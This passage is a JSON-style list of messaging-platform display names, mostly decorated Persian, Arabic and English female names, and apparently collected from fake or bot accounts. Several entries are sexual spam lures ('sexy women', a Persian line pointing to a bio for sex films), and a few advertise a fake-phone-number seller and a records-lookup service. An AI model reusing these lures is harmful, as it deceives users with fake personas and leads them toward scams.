        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "roya",
        "🅺🅰🆃🅸",
        "بهنوش",
        "░M░e░l░ ░M░e░l░",
        "꧁༒☬Dorsa☬༒꧂",
        "▁ ▂ ▄ ▅ ▆ ▇ █ دختر پاییر █ ▇ ▆ ▅ ▄ ▂ ▁",
        "🔥🧜‍♀",
        "˜”*°•.˜”*°• نرگس •°*”˜.•°*”˜",
        "مهتاب",
        "ʀᴏʏᴀ",
        "یاسمین",
        "The king of New York",
        "ღ꧁ღ╭⊱ꕥ بیتا ꕥ⊱╮ღ꧂ღ",
        "ᶳᵃʰᵃʳ",
        "·.¸¸.·♩♪♫ بیتا♫♪♩·.¸¸.·",
        "",
        "ⓢⓐⓗⓐⓡ",
        "نرگس",
        "آلَمـ☬ᬽ⍣⃟ـلكه ️",
        "░M░e░l░ ░M░e░l░",
        "➶➶➶➶➶ 𝓓Ｏηʸ𝔸 ➷➷➷➷➷",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "~~<💚> sexy women <💚>~~",
        "(♥‿♥) Pani (♥‿♥)",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "یاسمین",
        "ⓗⓞⓜⓐ",
        "هستی",
        "",
        "پریا",
        "👣🐉 لاله 🌷✎",
        "♝🍧 هدیه 💋🎈",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "😲🐼 ریحانه ☺️💋",
        "elmira",
        "دریا^_^",
        "👌🐣 ایدا 💋🐧",
        "🅺🅰🆃🅸",
        "رها",
        "🅺🅰🆃🅸",
        "arezoo",
        "•´¯`•. آوینا جون .•´¯`•",
        "🍉 🎀 مبینا 🎀 🍉",
        "ایناز",
        "(♥‿♥) Pani (♥‿♥)",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "zahra",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "░M░e░l░ ░M░e░l░",
        "💤📿roya📿💤",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "✧🌌 🎀 فرشته 🎀 🌌✧",
        "مهلا",
        "💚👮 ندا ♨️🍓",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "FΛƬΣMΣ",
        "zari",
        "🅂🄰🄷🄰🅁",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "sanaz",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "محیا",
        "Hadis",
        "𝒮𝒶𝒽𝒶𝓇",
        "彡 یلـבا 彡",
        "کَمــنכ",
        "ⓢⓐⓗⓐⓡ",
        "maryam",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "دریا",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "الناز",
        "sara",
        "☹️🐚 نگین ♬👻",
        "🔥🧜‍♀",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "roya",
        "لیلا",
        "ونوس💟",
        "رها",
        "لیلا",
        "یاسمن",
        "≋̮̑m̮̮̑̑ȃ̮̮̑ȓ̮̮̑y̮̮̑̑ȃ̮̮̑m̮̑≋",
        "𝑠𝑎𝑟𝑖𝑛𝑎",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "🕶soreh",
        "✼ ҉ elmira ҉ ✼",
        "¸„.-•~¹°”ˆ˜¨ آتریسا خانم ¨˜ˆ”°¹~•-.„¸",
        "·.¸¸.·♩♪♫ آیسان ♫♪♩·.¸¸.·",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "🅺🅰🆃🅸",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "Ab",
        "mahsa",
        "تزعلني الدنيا وترضيني ضحكت امي",
        "ایناز",
        "(♥‿♥) Pani (♥‿♥)",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "setareh",
        "بهار",
        "░B░i░t░a░",
        "رها",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "donya",
        "(♥‿♥) Pani (♥‿♥)",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "رویا^_^💄",
        "fatemeh",
        "ایناز",
        "➶➶➶➶➶ 𝓓Ｏηʸ𝔸 ➷➷➷➷➷",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "░M░e░l░ ░M░e░l░",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "",
        "(♥‿♥) Pani (♥‿♥)",
        "🔥🧜‍♀",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "hana",
        "Parisa",
        "",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "\"\"",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "ʀᴏʏᴀ",
        "Z♥️a♥️h♥️r♥️a",
        "Ｅｌｍｉｒａ",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "*•.¸♡ مهلا ♡¸.•*",
        "negen",
        "(♥‿♥) Pani (♥‿♥)",
        "sara",
        "مهتاب",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "هستی:-)😚",
        "彡 نازنین",
        "رها",
        "Men gomoseksualligimni yaxshi ko'raman",
        "░s░a░r░i░n░a░",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "یسنا",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "░▒▓█ یلـבا █▓▒░",
        "fati",
        "Zohreh",
        "【﻿ｍａｒｙａｍ",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "سوسن خانوم😛",
        "",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "ساناز",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "بیتا",
        "رها",
        "♘☠️ مائده 💋🍧",
        "بیتا",
        "ساناز",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "sexy fake saxy",
        "✳️ 🎀 پریا 🎀 ✳️",
        "بیتا",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "elnaz",
        "sexy fake saxy",
        "░s░a░r░i░n░a░",
        "˜”*°•.˜”*°• نرگس •°*”˜.•°*”˜",
        "Ｅｌｍｉｒａ",
        "░▒▓█ یلـבا █▓▒░",
        "سارا",
        "roya",
        "yalda",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "~~<💚> sexy women <💚>~~",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "◦•●◉✿ زهرا مراـבی ✿",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "~~<💚> sexy women <💚>~~",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "کیمیا",
        "░▒▓█ یلـבا █▓▒░",
        "𝖘𝖆𝖗",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "Z♥️a♥️h♥️r♥️a",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "Slom",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "·.¸¸.·♩♪♫ دریا ♫♪♩·.¸¸.·",
        "꧁sara",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "donya",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "سرنا",
        "جـمیلہ",
        "𝘀𝗮𝗿",
        "👤💋 هستی 🎅🐚",
        "▁ ▂ ▄ ▅ ▆ ▇ █ دختر پاییر █ ▇ ▆ ▅ ▄ ▂ ▁",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "𝚜𝚊𝚛𝚒",
        "░M░e░l░ ░M░e░l░",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "ایناز",
        "꧁༒☬Dorsa☬༒꧂",
        "⋆✴️ 🎀 نسترن 🎀 ✴️⋆",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "🔥🧜‍♀",
        "••.•´¯`•.•• 🎀 𝒜𝓈𝒶𝓁 🎀 🎀•.•`¯´•.••",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "ɞ𝓝𝓪𝓼𝓲𝓶 🕊",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "کوثر",
        "baran",
        "سارا",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "اتنا",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "raha",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "ایناز",
        "dorsa",
        "ᶳᵃʰᵃʳ",
        "💤📿roya📿💤",
        "سارا",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "ｒｏｙａ",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "elnaz",
        "mina",
        "👣🐉 لاله 🌷✎",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "░T░i░n░a░",
        "︎",
        "【﻿ｍａｒｙａｍ",
        "raha",
        "فاطمه",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "baran",
        "dorsa",
        "elmira",
        "𝓼𝓪𝓻𝓪",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "baran",
        "~~<💚> sexy women <💚>~~",
        "🔥🧜‍♀",
        "مهسا",
        "◦•●◉✿ دلارام جووون ✿◉●•◦",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "ie",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "(¯´•._.• باران •._.•´¯)",
        "·.¸¸.·♩♪♫ دریا ♫♪♩·.¸¸.·",
        "꧁༒☬Dorsa☬༒꧂",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "sexy fake saxy",
        "✼ ҉ elmira ҉ ✼",
        "¸„.-•~¹°”ˆ˜¨ آتریسا خانم ¨˜ˆ”°¹~•-.„¸",
        "هانیه^_^💋",
        "🔥🧜‍♀",
        "yalda",
        "مینو",
        "🅺🅰🆃🅸",
        "naughty girl",
        "𝓼𝓪𝓻𝓪",
        "مبینا",
        "baran",
        "🅽🅰️🆉",
        "🅺🅰🆃🅸",
        "彡MaahDokht彡",
        "zaHRa",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "Leyla",
        "پریا",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "✞✞ ♬♡مبینا ✞✞",
        "بهار",
        "samira",
        "💜 یاسمین ♣️☟",
        "Samira Kashani",
        "بهاره",
        "🅂🄰🄷🄰🅁",
        "donya",
        "zahra",
        ": جُولٺن ♚َ .",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "Pari",
        "sanaz",
        "ıllıllı مریم ıllıllı",
        "✷ 🎀 𝑅𝒶𝒽𝒶 🎀 🎀✷",
        "ایناز",
        "𝒮𝒶𝒽𝒶𝓇",
        "نن - البايوو",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "؟",
        "(♥‿♥) Pani (♥‿♥)",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "𝑺𝒂𝒎𝒂 °",
        "░M░e░l░ ░M░e░l░",
        "Hedye",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "░M░e░l░ ░M░e░l░",
        "عسل",
        "Sargol",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "Parisa",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "𝟎𝟑:𝟒𝟒 •",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "░M░e░l░ ░M░e░l░",
        "naughty girl",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "نسترن",
        "▀▄▀▄▀▄ 🎀 دریا 🎀 ▄▀▄▀▄▀",
        "نسیم:-\\",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "👣🐉 لاله 🌷✎",
        "نرگس",
        "(♥‿♥) Pani (♥‿♥)",
        "نسترن",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        ".o0×X×0o. Mohadeseh .o0×X×0o.",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "🅺🅰🆃🅸",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "*•.¸♡ Vida ♡¸.•*",
        "سمیرا",
        "مهتاب",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "مریمی",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "مریمی",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "🔥🧜‍♀",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "مریمی",
        "🅺🅰🆃🅸",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "asal",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "ز⃝ ر⃝ ی⃝",
        "Nastaran",
        "40",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "【﻿Ｅｌｎａｚ】",
        "رویا:-\\",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "♧🐻 الهام ☺️☠️",
        "Donyaaa",
        "vida😍♥️",
        "Roya",
        "سمانه",
        "هستی🌹",
        "عسلی(-:💋",
        "🍩💀 𝒆𝓵ｎάŻ 🐸💞",
        "Nasim",
        "اهوشلك",
        "彡MaahDokht彡",
        "بَٰـيٰـدِؤ ⁽🌝₎᎒ ∬❖",
        "✞༒Nafas༒✞",
        "رها",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "😈 Shadi 🤗",
        "Narges",
        "【﻿Ｅｌｎａｚ】",
        "*•.¸♡ Vida ♡¸.•*",
        "彡MaahDokht彡",
        "🅂🄰🅁🄰",
        "nazi🙂",
        "FΛƬΣMΣ",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "Ｅｌｍｉｒａ",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "ترنم :-[^_^",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "🅺🅰🆃🅸",
        "FΛƬΣMΣ",
        "",
        "",
        "(♥‿♥) Pani (♥‿♥)",
        "سارگل",
        "بهنوش",
        "Farnoosh",
        "شمـشاכ",
        "✶ 🎀 بهار 🎀 ✶",
        "🍩💀 𝒆𝓵ｎάŻ 🐸💞",
        "َ",
        "T R U N K S 🇳🇱",
        "Haniye",
        "░▒▓█►─═ سارا ═─◄█▓▒░",
        "عسلی (-:",
        "~{ول`ي}~",
        "بهنوش",
        "تینــا",
        "nazi",
        "yasi💜",
        "𝑠𝑎𝑟𝑖𝑛𝑎",
        "",
        "عتريس",
        "رها",
        "OY",
        "",
        "KID",
        "✷ 🎀 𝑅𝒶𝒽𝒶 🎀 🎀✷",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "🆂🅰️🆁🅰️",
        "~~<💚> sexy women <💚>~~",
        "*•.¸♡ Vida ♡¸.•*",
        "Parisa",
        "ⓝⓐⓩⓐⓝⓘⓝ",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "(っ◔◡◔)っ ♥️ Beti ♥️",
        "🅺🅰🆃🅸",
        "",
        "░B░i░t░a░",
        "هہٰٖــنو",
        "راكان",
        "♔EES",
        "𓄂ꪴꪰتريد خاص𝑨𝐫.بياع ارقام وهميه .𖤈[🇫🇰]⁵⁰⁰𓆃™",
        "·.¸¸.·♩♪♫ آیسان ♫♪♩·.¸¸.·",
        "ً",
        "MOON OFF",
        "╰⊱♥️⊱╮ღ꧁ elmira ꧂ღ╭⊱♥️≺",
        "",
        "a🤧.",
        "🅺🅰🆃🅸",
        "‏هواريو",
        "(♥‿♥) Pani (♥‿♥)",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "ıllıllı سمیرا ıllıllı",
        "بايوㅤㅤㅤㅤ",
        "Q",
        "🫶🏻",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "🅺🅰🆃🅸",
        "🅺🅰🆃🅸",
        "2 - ♚",
        "ᗪ7ᗰ 🕊✨؛",
        "بهنوش",
        "سارا",
        "⚡️میترا⚡️",
        "",
        "M",
        "كازمن𓆩‎🇬🇧𓆪",
        "..",
        "فروووحه.",
        "حساب",
        "S",
        "Saud RONALDO",
        "مراد",
        "~~<💚> sexy women <💚>~~",
        "꧁مهتاب꧂",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "Nofe",
        "Maryam",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "STARK",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "ღ(¯◕‿◕´¯) ♫ ♪ ♫ Night Girl ♫ ♪ ♫ (¯◕‿◕´¯)ღ",
        "((+_+))((+_+))○∞∞∞ Heavenly angel on earth ∞∞∞○((+_+))((+_+))",
        "🇺🇲_ ᵐᵃʰⁿᵃᶻ_♡",
        "░M░e░l░ ░M░e░l░",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "یگـⷩــⷷــᷡــⷶــᷚــⷷــꙷــانـه",
        "ⓅⒶⓇⒾⓈⒶ 🐾💜",
        "Is there something in your mouth? ☺️",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "((+_+))((+_+))○∞∞∞ Heavenly angel on earth ∞∞∞○((+_+))((+_+))",
        "░M░e░l░ ░M░e░l░",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "✷ 🎀 𝑅𝒶𝒽𝒶 🎀 🎀✷",
        "😲🐼 ریحانه ☺️💋",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "((+_+))((+_+))○∞∞∞ Heavenly angel on earth ∞∞∞○((+_+))((+_+))",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "فیلم‌سـکـسی‌میخوای‌بیوبخون",
        "ղìӀօƒąɾ",
        "بیوگرافیموبخون",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "🥀 ░D░o░n░y░a░ 🌈",
        "RAEEZO",
        "PAMSI",
        "𓍳ˢᵃⁱᶠ🥺🦋",
        "dangerous",
        "sina",
        "ادمین میشم چنل قوی داری اد کن",
        "@#$%*_*",
        "۰۹۸خرلر",
        "بترس",
        "زهرا",
        "安东尼",
        "女娲丨查档",
        "买烟找我",
        "🅺🅰🆃🅸",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "شذأ",
